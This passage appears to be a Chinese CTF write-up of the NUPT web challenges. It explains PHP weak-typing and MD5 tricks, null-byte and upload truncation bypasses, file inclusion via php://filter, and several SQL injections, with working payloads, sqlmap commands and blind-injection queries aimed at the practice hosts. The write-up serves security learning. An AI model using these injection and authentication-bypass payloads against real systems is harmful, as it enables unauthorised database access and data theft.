var_dump($b8==$c8);//false var_dump($a8+$b8);//float(20) var_dump($a8+$c8);//float(20) var_dump($b8+$c8);//float(20) 4、其他符合/0[eE]\\d{30}/的MD5值：\nstring(strlen($var)) $var string(strlen(md5($var))) md5($var) QNKCDZO 0e830400451993494058024219903391 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s1502113478a 0e861580163291561247404381396064 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s1184209335a 0e072485820392773389523109082030 s1665632922a 0e731198061491163073197128363787 s532378020a 0e220463095855511507588041205815 240610708 0e462097431906509019562988736854 签到2 1 2 3 4 5 6 7 8 9 \u0026lt;html\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Type\u0026#34; content=\u0026#34;text/html; charset=UTF-8\u0026#34; /\u0026gt; 尚未登录或口令错误 \u0026lt;form action=\u0026#34;./index.php\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;p\u0026gt;输入框：\u0026lt;input type=\u0026#34;password\u0026#34; value=\u0026#34;\u0026#34; name=\u0026#34;text1\u0026#34; maxlength=\u0026#34;10\u0026#34;\u0026gt;\u0026lt;br\u0026gt; 请输入口令：zhimakaimen \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;开门\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/html\u0026gt; nctf{follow_me_to_exploit}\nmaxlength=\u0026ldquo;10\u0026rdquo; 而口令 zhimakaimen 有11位，数据在前端就会被截断掉。这时有两种做法，一种是在chrome/Firefox浏览器的开发者工具中将 maxlength=\u0026ldquo;10\u0026rdquo; 字段修改为 maxlength=\u0026ldquo;11\u0026rdquo; 或是更大的值；另一种是使用hackbar或burp直接向 http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php post text1=zhimakaimen 。客户端的行为都是可控的，所以熟悉HTML和JavaScript是重要的。\n这题不是WEB nctf{photo_can_also_hid3_msg}\n下载图片并用winhex打开，在末尾发现字符串。一个简单的隐写。\n层层递进 nctf{this_is_a_fl4g}\n查看源代码，跟随链接，依次访问SO.html -\u0026gt; S0.html-\u0026gt;SO.htm -\u0026gt;S0.htm-\u0026gt;404.html ，在最后一个页面里的注释部分可找到flag。还是查看源代码，细心就会发现异常。\nAAencode nctf{javascript_aaencode}\naaencode是一种把js代码编码成日语颜文字的编码方式，使用Unicode编码查看，然后 在线解码 。工具作者颇有幽默感。\n单身二十年 nctf{yougotit_script_now}\n访问 http://chinalover.sinaapp.com/web8/search_key.php 会被重定向到 http://chinalover.sinaapp.com/web8/no_key_is_here_forever.php ，重定向会被浏览器自动处理，burp抓包则可见flag。\n你从哪里来 你是从 google 来的吗？ 传送门：题目地址\nnctf{http_referer}\n给请求加上referer: https://www.google.com即可。从https://github.com/otakekumi/NUPT_Challenges/blob/master/WEB/%E4%BD%A0%E4%BB%8E%E5%93%AA%E9%87%8C%E6%9D%A5/index.php 看到源代码可能有点问题。\n1 2 3 4 5 6 7 8 \u0026lt;?php $referer = $_SERVER[\u0026#39;referer\u0026#39;]; if ($referer === \u0026#34;https://www.google.com/ \u0026#34; || $referer === \u0026#34;https://www.google.com\u0026#34;){ echo \u0026#34;nctf{http_referer}\u0026#34;; }else{ echo \u0026#34;are you from google?\u0026#34;; } ?\u0026gt; 第二行应该是 $referer = $_SERVER['HTTP_REFERER']; ？\nphp decode 1 2 3 4 5 6 7 8 9 \u0026lt;?php function CLsI($ZzvSWE) { $ZzvSWE = gzinflate(base64_decode($ZzvSWE)); for ($i = 0; $i \u0026lt; strlen($ZzvSWE); $i++) { $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1); } return $ZzvSWE;} echo CLsI(\u0026#34;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==\u0026#34;); nctf{gzip_base64_hhhhhh}\n运行代码即可。\n文件包含 nctf{edulcni_elif_lacol_si_siht}\n使用PHP的filter协议读取index.php，即访问 http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/convert.base64-encode/resource=index.php ，将得到的字符串base64解码。\n单身一百年也没用 nctf{this_is302redirect}\nflag藏在响应头中。\nDownload~! nctf{download_any_file_666}\n访问 http://way.nuptzj.cn/web6/download.php?url=base64-of-file-name 可以下载允许下载的任意文件，所以先下载download.php，得到白名单列表里有hereiskey.php，再下载下来就可见flag。\nCOOKIE nctf{cookie_is_different_from_session}\n看到响应头中有Set-Cookie: Login=0，因此在请求头加入Cookie: Login=1即可。\nMYSQL nctf{query_in_mysql}\n根据提示查看robots.txt，内容如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 TIP:sql.php \u0026lt;?php if($_GET[id]) { mysql_connect(SAE_MYSQL_HOST_M . \u0026#39;:\u0026#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $id = intval($_GET[id]); $query = @mysql_fetch_array(mysql_query(\u0026#34;select content from ctf2 where id=\u0026#39;$id\u0026#39;\u0026#34;)); if ($_GET[id]==1024) { echo \u0026#34;\u0026lt;p\u0026gt;no! try again\u0026lt;/p\u0026gt;\u0026#34;; } else{ echo($query[content]); } } ?\u0026gt; 说明要向sql.php提交一个id，使得intval($_GET[id])为1024而$_GET[id]==1024为假。intval识别到非数字的那一位，而松散比较前的强制类型转换会把e当作科学计数法的一部分处理，所以可以提交id=1024e1等，如访问http://chinalover.sinaapp.com/web11/sql.php?id=1024e1。\n1、robots.txt可能藏有提示\n2、int intval ( mixed $var [, int $base = 10 ] )只取/\\d*/的部分。\nsql injection 3 nctf{gbk_3sqli}\n分别访问id=2和id=3得到提示gbk_sql_injection和the fourth table，所以是存在宽字节注入，flag在第四个表里面。上sqlmap跑一跑，最后一步是这样：\n1 python sqlmap.py -u \u0026#34;http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%d6\u0026#39;\u0026#34; -T ctf4 -C flag --dump 也可以手注：\n步骤一：确认该点存在注入 1 2 3 4 5 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2 和 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6%27--+ 返回结果相同。 由于MySQL执行查询时会跳过畸形字符，而 id=2%d6%27--+ 经过转义变为id=2%d6%5c%27--+ ， 其中%d6%5c被合在一起解释，也就是id = \u0026#39;2Ö\u0026#39;-- 效果等价于 id = \u0026#39;2\u0026#39;--，但我们获得了执行sql的机会。 步骤二：查询数据库名 1 2 3 发现支持union查询 ， http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6%27+and+0+union+select+null,database()--+ ，之所以要加and+0+是因为显示点只有一处，必须让原来的查询失败。得到数据库名为\u0026#39;sae-chinalover\u0026#39;。 步骤三：查询名为\u0026rsquo;sae-chinalover\u0026rsquo;的数据库的表的数量和名字 1 2 3 4 5 6 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6\u0026#39;+and+0+union+select+null,count(*)+from+information_schema.tables+where+table_schema=database()--+ 得到目前的数据库含有5张表 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6\u0026#39;+and+0+union+select+null,table_name+from+information_schema.tables+where+table_schema=database()+limit+3,1--+ 得到第四张表表名为\u0026#39;ctf4\u0026#39; MySQL的information_schema数据库包含所有数据库的元信息，其中的tables表包含其他数据库的数据库名、表名、表类型、创建时间等许多信息，其中table_schema列为数据库名，table_name列为表名。因为能显示出来的记录有限，所以必须用limit来控制要显示第几条记录，否则只能显示第一条。 limit用法是这样LIMIT {[offset,] row_count | row_count OFFSET offset}，必须放在where后面。 步骤四：查询表\u0026rsquo;ctf4\u0026rsquo;中的flag 1 2 3 4 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6\u0026#39;+and+0+union+select+null,count(*)+from+ctf4--+ 发现该表只有一条记录 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6\u0026#39;+and+0+union+select+null,flag+from+ctf4--+ 猜测列名为flag，查询得到flag 附一个select查询语法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 SELECT [ALL | DISTINCT | DISTINCTROW ] [HIGH_PRIORITY] [STRAIGHT_JOIN] [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT] [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS] select_expr [, select_expr ...] [FROM table_references [PARTITION partition_list] [WHERE where_condition] [GROUP BY {col_name | expr | position} [ASC | DESC], ... [WITH ROLLUP]] [HAVING where_condition] [ORDER BY {col_name | expr | position} [ASC | DESC], ...] [LIMIT {[offset,] row_count | row_count OFFSET offset}] [PROCEDURE procedure_name(argument_list)] [INTO OUTFILE \u0026#39;file_name\u0026#39; [CHARACTER SET charset_name] export_options | INTO DUMPFILE \u0026#39;file_name\u0026#39; | INTO var_name [, var_name]] [FOR UPDATE | LOCK IN SHARE MODE]] /x00 nctf{use00to_jieduan}\n访问得到源码\n1 2 3 4 5 6 7 8 if (isset ($_GET[\u0026#39;nctf\u0026#39;])) { if (@ereg (\u0026#34;^[1-9]+$\u0026#34;, $_GET[\u0026#39;nctf\u0026#39;]) === FALSE) echo \u0026#39;必须输入数字才行\u0026#39;; else if (strpos ($_GET[\u0026#39;nctf\u0026#39;], \u0026#39;#biubiubiu\u0026#39;) !== FALSE) die(\u0026#39;Flag: \u0026#39;.$flag); else echo \u0026#39;骚年，继续努力吧啊~\u0026#39;; } 要求提交的nctf的值符合正则匹配(一个或多个数字)并且能被strpos找到#biubiubiu ，根据提示查到资料ereg会把null视为字符串的结束，从而被%00截断，而strpos则可以越过%00，所以提交nctf=1%00%23biubiubiu即可。\n参考资料\n由于在PHP中string的实现本质上是一个以字节为单位的数组加上一个声明缓冲区长度的整形，因此string类型可以由任何值构成，即使是“NUL bytes”，但PHP中有些底层库（比如C语言相关的，因为C语言中\\0标识字符串的结束）会忽略\u0026quot;a NUL byte\u0026quot;后面的数据，使用了这些库的函数就是非二进制安全的(non-binary-safe)，ereg就是一个例子。闲着无聊搜了一下发现还有这么一些函数：\nint strcoll ( string $str1 , string $str2 ) Locale based string comparison (when current locale is not C or POSIX) public array TokyoTyrantTable::get ( mixed $keys ) Gets a row from table database. (version\u0026gt;0.3.0) public Exception::__construct ([ string $message = \u0026quot;\u0026quot; [, int $code = 0 [, Throwable $previous = NULL ]]] ) Construct the exception 。其中对message的处理是非二进制安全的。 public Error::__construct ([ string $message = \u0026quot;\u0026quot; [, int $code = 0 [, Throwable $previous = NULL ]]] ) Construct the error object 。其中对message的处理是非二进制安全的。 bool error_log ( string $message [, int $message_type = 0 [, string $destination [, string $extra_headers ]]] ) Sends an error message to the web server\u0026rsquo;s error log or to a file.。其中对message的处理是非二进制安全的。(error_log() is not binary safe. message will be truncated by null character.) bool radius_put_string ( resource $radius_handle , int $type , string $value [, int $options = 0 [, int $tag ]] ) Attaches a string attribute。 其中$value值基于会被null截断的底层库，是非二进制安全的。 bool radius_put_vendor_string ( resource $radius_handle , int $vendor , int $type , string $value [, int $options = 0 [, int $tag ]] ) Attaches a vendor specific string attribute 。$value是非二进制安全的。 string addcslashes ( string $str , string $charlist ) （存疑，似乎并不是） Quote string with slashes in a C style. Returns a string with backslashes before characters that are listed in charlist parameter. array gzfile ( string $filename [, int $use_include_path = 0 ] ) （存疑，待验证） Read entire gz-file into an array 还有这些 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;?php $s=$_REQUEST[\u0026#39;a\u0026#39;]; // http://localhost/test.php?a=asd%00asdf $p=\u0026#39;asdf\u0026#39;; var_dump(ereg_replace($p,\u0026#39;abcc\u0026#39;,$s)); //string(3) \u0026#34;asd\u0026#34; var_dump(eregi_replace($p,\u0026#39;abcc\u0026#39;,$s));//string(3) \u0026#34;asd\u0026#34; var_dump(ereg($p,$s));//bool(false) var_dump(eregi($p,$s));//bool(false) var_dump(split($p,$s));//array(1) { [0]=\u0026gt; string(8) \u0026#34;asd\\0asdf\u0026#34; } var_dump(split($p,$s));//array(1) { [0]=\u0026gt; string(8) \u0026#34;asd\\0asdf\u0026#34; } var_dump(sql_regcase($s)); //看起来没问题啊。。。string(29) \u0026#34;[Aa][Ss][Dd]\\0[Aa][Ss][Dd][Ff]\u0026#34; // ereg_replace — Replace regular expression // ereg — Regular expression match // eregi_replace — Replace regular expression case insensitive // eregi — Case insensitive regular expression match // split — Split string into array by regular expression // spliti — Split string into array by regular expression case insensitive // sql_regcase — Make regular expression for case insensitive match bypass again nctf{php_is_so_cool}\n访问得到源码\n1 2 3 4 5 6 7 if (isset($_GET[\u0026#39;a\u0026#39;]) and isset($_GET[\u0026#39;b\u0026#39;])) { if ($_GET[\u0026#39;a\u0026#39;] != $_GET[\u0026#39;b\u0026#39;]) if (md5($_GET[\u0026#39;a\u0026#39;]) === md5($_GET[\u0026#39;b\u0026#39;])) die(\u0026#39;Flag: \u0026#39;.$flag); else print \u0026#39;Wrong.\u0026#39;; } 源码要求提交两个不相等的值使他们的md5值严格相等。md5()函数要求接收一个字符串，若传递进去一个数组，则会返回null，即var_dump(md5(array(2))===null);值为bool(true) ，因此向$_GET数组传入两个名为a、b的不相等的数组，从而导致md5()均返回空，于是得到flag，如访问 http://chinalover.sinaapp.com/web17/index.php?a[]=\u0026amp;b[]=1\n变量覆盖 nctf{bian_liang_fu_gai!}\nsource.php核心代码如下\n1 2 3 4 5 6 \u0026lt;?php if ($_SERVER[\u0026#34;REQUEST_METHOD\u0026#34;] == \u0026#34;POST\u0026#34;) { extract($_POST); if ($pass == $thepassword_123) echo $theflag; } extract()函数原型为int extract(array \u0026amp;$var_array [,int $extract_type=EXTR_OVERWRITE [,string $prefix = NULL]]) ，从数组中将变量导入当前符号表，$extract_type缺省值为1，若没有另外指定，函数将覆盖已有变量，故传入任意pass和与之相等的thepassword_123即可。其实我们甚至可以覆盖theflag变量，但是那样就拿不到真正的flag了 :D。source.php包含源码。\nPHP是世界上最好的语言 nctf{php_is_best_language}\nindex.txt核心代码如下\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?php if(eregi(\u0026#34;hackerDJ\u0026#34;,$_GET[id])) { echo(\u0026#34;\u0026lt;p\u0026gt;not allowed!\u0026lt;/p\u0026gt;\u0026#34;); exit(); } $_GET[id] = urldecode($_GET[id]); if($_GET[id] == \u0026#34;hackerDJ\u0026#34;) { echo \u0026#34;\u0026lt;p\u0026gt;Access granted!\u0026lt;/p\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;p\u0026gt;flag: *****************} \u0026lt;/p\u0026gt;\u0026#34;; } 网页会拒绝任何含有hackerDJ的提交(忽略大小写)，但接受urldecode后为hackerDJ的字符串，所以按照对照表编码，并将%编码为%25后提交，自动解码一次后%25变为%,代码中再解码一次后便得到flag。即访问 http://way.nuptzj.cn/php/index.php?id=%2568%2561%2563%256b%2565%2572%2544%254a 这是个二次编码的问题。\n伪装者 这是一个到处都有着伪装的世界 题目地址：点我\nnctf{happy_http_headers}\nreferer改了没用，据说请求头添加X-Forwarded-For: 127.0.0.1即可，没有成功，怀疑服务端代码有问题，可能是和你从哪里来那题一样的问题。XFF头用以标志客户端真实IP，常用在使用HTTP 代理或者负载均衡服务时。\nheader nctf{tips_often_hide_here}\n使用chrome浏览器的开发者工具可以看到相应数据包的头部有flag字段，其值即flag。\n上传绕过 题目地址：猜猜代码怎么写的\nnctf{welcome_to_hacks_world}\n当filename为1.jpg时返回如下:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 Array ( [0] =\u0026gt; .jpg [1] =\u0026gt; jpg ) Upload: 1.jpg\u0026lt;br /\u0026gt;Type: text/plain\u0026lt;br /\u0026gt;Size: 0.0078125 Kb\u0026lt;br /\u0026gt;Stored in: ./uploads/8a9e5f6a7a789acb.phparray(4) { [\u0026#34;dirname\u0026#34;]=\u0026gt; string(9) \u0026#34;./uploads\u0026#34; [\u0026#34;basename\u0026#34;]=\u0026gt; string(5) \u0026#34;1.jpg\u0026#34; [\u0026#34;extension\u0026#34;]=\u0026gt; string(3) \u0026#34;jpg\u0026#34; [\u0026#34;filename\u0026#34;]=\u0026gt; string(1) \u0026#34;1\u0026#34; } \u0026lt;br\u0026gt;必须上传成后缀名为php的文件才行啊！\u0026lt;br\u0026gt;\u0026lt;/body\u0026gt; 当filename为1.php时返回如下：\n1 2 3 4 5 6 Array ( [0] =\u0026gt; .php [1] =\u0026gt; php ) 不被允许的文件类型,仅支持上传jpg,gif,png后缀的文件 观察源码为：\n1 2 3 4 5 6 7 8 9 文件上传\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;form action=\u0026#34;upload.php\u0026#34; method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;file\u0026#34;\u0026gt;Filename:\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;dir\u0026#34; value=\u0026#34;/uploads/\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34; id=\u0026#34;file\u0026#34; /\u0026gt; \u0026lt;br /\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; name=\u0026#34;submit\u0026#34; value=\u0026#34;Submit\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; 因为最后应该是dir和file连接，所以可以通过修改隐藏元素dir的value来实现截断上传。即抓包后修改\n/uploads/为/uploads/1.php0x00，然后file保持1.jpg，连起来后就是/uploads/1.php%001.jpg，则既绕过了白名单验证又上传了PHP后缀的文件。（0x00是指修改16进制值，不可见。）\nsql注入1 听说你也会注入？ 地址： 题目地址\nnctf{ni_ye_hui_sql?}\n在 http://chinalover.sinaapp.com/index.phps 查看源码，核心部分如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;?php if($_POST[user] \u0026amp;\u0026amp; $_POST[pass]) { mysql_connect(SAE_MYSQL_HOST_M . \u0026#39;:\u0026#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = trim($_POST[user]); $pass = md5(trim($_POST[pass])); $sql=\u0026#34;select user from ctf where (user=\u0026#39;\u0026#34;.$user.\u0026#34;\u0026#39;) and (pw=\u0026#39;\u0026#34;.$pass.\u0026#34;\u0026#39;)\u0026#34;; echo \u0026#39;\u0026lt;/br\u0026gt;\u0026#39;.$sql; $query = mysql_fetch_array(mysql_query($sql)); if($query[user]==\u0026#34;admin\u0026#34;) { echo \u0026#34;\u0026lt;p\u0026gt;Logged in! flag:******************** \u0026lt;/p\u0026gt;\u0026#34;; } if($query[user] != \u0026#34;admin\u0026#34;) { echo(\u0026#34;\u0026lt;p\u0026gt;You are not admin!\u0026lt;/p\u0026gt;\u0026#34;); } } echo $query[user]; 会对传入参数两端去空格，然后sql拼接如下\n$sql=\u0026quot;select user from ctf where (user='\u0026quot;.$user.\u0026quot;') and (pw='\u0026quot;.$pass.\u0026quot;')\u0026quot;; ，\n所以只要用构造一下user的值，使语法无误，然后注释掉后面的即可。MySQL主要有三种注释方式#注释到行尾，/*bla*/用于行间或多行注释，-- 也是注释到行尾，但需要注意的是在两个减号后面至少要有一个\\s，也就是空格，TAB，换行符等。\n所以本题可post user=admin')-- -\u0026amp;pass=123或user=admin')#\u0026amp;pass=123，\nsql语句就变成select user from ctf where (user='admin')#' and (pw='123'),\n查询语句就能成功返回user列，值为admin的那条记录。\npass check nctf{strcmp_is_n0t_3afe}\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;?php $pass=@$_POST[\u0026#39;pass\u0026#39;]; $pass1=***********;//被隐藏起来的密码 if(isset($pass)) { if(@!strcmp($pass,$pass1)){ echo \u0026#34;flag:nctf{*}\u0026#34;; }else{ echo \u0026#34;the pass is wrong!\u0026#34;; } }else{ echo \u0026#34;please input pass!\u0026#34;; } ?\u0026gt; 考察PHP弱类型，从PHP社区文档的注解可以发现strcmp函数在比较失败，即传入数组，时会返回null。(还有一个比较有意思的是当有一个字符串长度为0时，返回的是相互比较的两个字符串长度的差值。)所以post的数据为pass[]=\n起名字真难 nctf{follow_your_dream}\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 \u0026lt;?php function noother_says_correct($number) { $one = ord(\u0026#39;1\u0026#39;); $nine = ord(\u0026#39;9\u0026#39;); for ($i = 0; $i \u0026lt; strlen($number); $i++) { $digit = ord($number{$i}); if ( ($digit \u0026gt;= $one) \u0026amp;\u0026amp; ($digit \u0026lt;= $nine) ) { return false; } } return $number == \u0026#39;54975581388\u0026#39;; } $flag=\u0026#39;*******\u0026#39;; if(noother_says_correct($_GET[\u0026#39;key\u0026#39;])) echo $flag; else echo \u0026#39;access denied\u0026#39;; ?\u0026gt; 要求传入key不包含[1-9]，但又等于54975581388，考虑转十六进制，发现54975581388=0xccccccccc，\n因此访问 http://chinalover.sinaapp.com/web12/index.php?key=0xccccccccc\n密码重置 重置管理员账号：admin 的密码\n你在点击忘记密码之后 你的邮箱收到了这么一封重置密码的邮件：\n点击此链接重置您的密码\nnctf{reset_password_often_have_vuln\n修改重置链接的URL和POST中对应参数为admin相关的即可。\n即向 http://nctf.nuptzj.cn/web13/index.php?user1=YWRtaW4%3D post user=admin\u0026amp;newpass=aaaaa\u0026amp;vcode=1234 。\nphp反序列化 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?php class just4fun { var $enter; var $secret; } if (isset($_GET[\u0026#39;pass\u0026#39;])) { $pass = $_GET[\u0026#39;pass\u0026#39;]; if(get_magic_quotes_gpc()){ $pass=stripslashes($pass); } $o = unserialize($pass); if ($o) { $o-\u0026gt;secret = \u0026#34;*\u0026#34;; if ($o-\u0026gt;secret === $o-\u0026gt;enter) echo \u0026#34;Congratulation! Here is my secret: \u0026#34;.$o-\u0026gt;secret; else echo \u0026#34;Oh no... You can\u0026#39;t fool me\u0026#34;; } else echo \u0026#34;are you trolling?\u0026#34;; } 链接失效，本地搭建环境实验。反序列化后的secret成员被赋予未知的值却要求另一成员enter其值与之相同，\n从官方文档看到这么一句\nCircular references inside the array/object you are serializing will also be stored，\n说明对象包含的引用在序列化时也会被存储，所以如果enter指向secret的引用，两个成员的值就可以同步变化了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?php class just4fun{ var $secret; var $enter ; } $f=new just4fun(); $f-\u0026gt;enter=\u0026amp;$f-\u0026gt;secret; $sf=serialize($f); print_r($sf); $usf=unserialize($sf); echo \u0026#39;\u0026lt;br/\u0026gt;\u0026#39;; print_r($usf); 输出如下\nO:8:\u0026ldquo;just4fun\u0026rdquo;:2:{s:6:\u0026ldquo;secret\u0026rdquo;;N;s:5:\u0026ldquo;enter\u0026rdquo;;R:2;} just4fun Object ( [secret] =\u0026gt; [enter] =\u0026gt; )\n访问\nhttp://127.0.0.1/nanyou.php?pass=O:8:%22just4fun%22:2:{s:6:%22secret%22;N;s:5:%22enter%22;R:2;}\n验证成功。\n别处看到flag为nctf{serialize_and_unserialize}\nsql injection4 继续注入吧~ 题目地址\nTIP:反斜杠可以用来转义 仔细查看相关函数的用法\nnctf{sql_injection_is_interesting}\n页面源代码注释中有SQL构造方式：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #GOAL: login as admin,then get the flag; error_reporting(0); require \u0026#39;db.inc.php\u0026#39;; function clean($str){ if(get_magic_quotes_gpc()){ $str=stripslashes($str); } return htmlentities($str, ENT_QUOTES); } $username = @clean((string)$_GET[\u0026#39;username\u0026#39;]); $password = @clean((string)$_GET[\u0026#39;password\u0026#39;]); $query=\u0026#39;SELECT * FROM users WHERE name=\\\u0026#39;\u0026#39;.$username.\u0026#39;\\\u0026#39; AND pass=\\\u0026#39;\u0026#39;.$password.\u0026#39;\\\u0026#39;;\u0026#39;; $result=mysql_query($query); if(!$result || mysql_num_rows($result) \u0026lt; 1){ die(\u0026#39;Invalid password!\u0026#39;); } echo $flag; 核心函数是htmlentities($str, ENT_QUOTES) ，函数原型是这样\n1 string htmlentities ( string $string [, int $flags = ENT_COMPAT | ENT_HTML401 [, string $encoding = ini_get(\u0026#34;default_charset\u0026#34;) [, bool $double_encode = true ]]] ) 参数flags缺省情况下与$flags=ENT_QUOTES情况下函数行为不同，\n选值为ENT_QUOTES时 Will convert both double and single quotes，\n也就是说，前者不会将单引号编码而后者会。我们的最终目标是平衡引号，从而使查询语句语法正确，既然无法输入单引号，就消灭单引号。\n访问http://chinalover.sinaapp.com/web15/index.php?username=\\\u0026amp;password=%20or%201%23，\n也就是构造payload为?username=\\\u0026amp;password=%20or%201%23 ，使得查询语句如下：\n1 2 3 4 5 6 7 8 SELECT * FROM users WHERE name=\u0026#39;\\\u0026#39; AND pass=\u0026#39;%20or%201%23\u0026#39; 即 SELECT * FROM users WHERE name=\u0026#39;\\\u0026#39; AND pass=\u0026#39; 『 [name]的值为 [\u0026#39; AND pass=] ，显然逻辑值为false 』 or 1 『 但没关系，[false or 1] 的逻辑值为真』 #\u0026#39; 『 注释掉多余的单引号 』 即 select * from users where false or 1 附：\n​\t具体编码方式可使用\nprint_r(get_html_translation_table($table =HTML_ENTITIES,$flags=ENT_QUOTES))查看，\n| ENT_COMPAT | ENT_HTML401 | ENT_QUOTES | | :\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;: | :\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;-: | | [\u0026amp;] =\u0026gt; \u0026amp;amp; | [\u0026amp;] =\u0026gt; \u0026amp;amp; | | [\u0026quot;] =\u0026gt; \u0026amp;quot; | [\u0026quot;] =\u0026gt; \u0026amp;quot; | | [\u0026lt;] =\u0026gt; \u0026amp;lt; | ['] =\u0026gt; \u0026amp;#039; | | [\u0026gt;] =\u0026gt; \u0026amp;gt; | [\u0026lt;] =\u0026gt; \u0026amp;lt; | | \u0026hellip; | [\u0026gt;] =\u0026gt; \u0026amp;gt; | | 共100个 | 共101个 |\n综合题 nctf{bash_history_means_what}\n1、访问链接得到一大段jsfuck代码，解码后得到document.write(\u0026quot;1bc29b36f623ba82aaf6724fd3b16718.php\u0026quot;) ;\n2、访问 http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php 在HTTP响应头得到提示tip:history of bash;\n3、访问 http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history ，看到页面内容为zip -r flagbak.zip ./* ;\n4、访问 http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip 得到flag。\nsql 注入2 注入第二题~~主要考察union查询 传送门:点我带你飞\nntcf{union_select_is_wtf}\nindex/phps中有源码如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;?php if($_POST[user] \u0026amp;\u0026amp; $_POST[pass]) { mysql_connect(SAE_MYSQL_HOST_M . \u0026#39;:\u0026#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]); $query = @mysql_fetch_array(mysql_query(\u0026#34;select pw from ctf where user=\u0026#39;$user\u0026#39;\u0026#34;)); if (($query[pw]) \u0026amp;\u0026amp; (!strcasecmp($pass, $query[pw]))) { echo \u0026#34;\u0026lt;p\u0026gt;Logged in! Key: ntcf{**************} \u0026lt;/p\u0026gt;\u0026#34;; } else { echo(\u0026#34;\u0026lt;p\u0026gt;Log in failure!\u0026lt;/p\u0026gt;\u0026#34;); } } ?\u0026gt; 因为\n1 2 var_dump(!strcasecmp(array(), $query[pw]));//bool(true) var_dump(!strcasecmp(md5(array()), $query[pw]));//bool(false) 所以没法用把pass作为数组传进去的伎俩。另外虽然第七行的$user处存在注入，但输出没有回显。想到基于时间延迟的盲注。主要用到三个函数，mid()，if()和sleep()：\n1 2 3 4 5 6 MID(str,pos,len) /*需注意pos从1而不是0开始，Return a substring starting from the specified position*/ IF(expr1,expr2,expr3) /*If expr1 is TRUE (expr1 \u0026lt;\u0026gt; 0 and expr1 \u0026lt;\u0026gt; NULL), IF() returns expr2. Otherwise, it returns expr3.*/ SLEEP(duration) /*Sleeps (pauses) for the number of seconds given by the duration argument, then returns 0.If SLEEP() is interrupted, it returns 1. The duration may have a fractional part.*/ 所以构造post数据\n1 user=admin\u0026#39; and if(mid(pw,1,1)\u0026gt;\u0026#39;9\u0026#39;,sleep(2),1)#\u0026amp;pass=blabla 如果if()函数的expr1正确，页面响应就会延时两秒，否则不会，以此为依据采用二分法调整。\npw字段的取值范围为/[\\da-e]/，\n最后注处字段值为21dd715a3605b2a4053e80387116c190，即md5('njupt')\n然后postuser=admin\u0026amp;pass=njupt即可。\nindex.phps藏源码。\n1 2 3 查到另一种简单的做法，即post如下数据 user=\u0026#39; union select \u0026#39;45cf93bd4f762c6597b68e615b153bd0\u0026#39;#\u0026amp;pass=findneo 其中\u0026#39;45cf93bd4f762c6597b68e615b153bd0\u0026#39;即md5(\u0026#39;findneo\u0026#39;) 这才是出题者的本意。我觉得这个做法很妙，看似理所当然的代码逻辑实际上不堪一击。\n综合题2 非xss题 但是欢迎留言~ 地址：get the flag\nflag:nctf{you_are_s0_g00d_hacker}\n详见南邮CTF平台综合题2writeup\n注入实战一 